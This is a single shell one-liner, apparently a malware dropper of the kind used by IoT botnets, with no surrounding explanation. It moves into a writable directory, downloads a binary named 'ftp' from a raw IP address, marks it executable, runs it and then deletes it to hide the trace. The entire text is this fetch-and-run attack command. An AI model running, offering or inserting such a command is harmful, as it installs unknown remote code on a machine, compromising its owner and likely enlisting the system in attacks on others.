cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.233/ftp; chmod +x ftp; ./ftp; rm -rf ftp
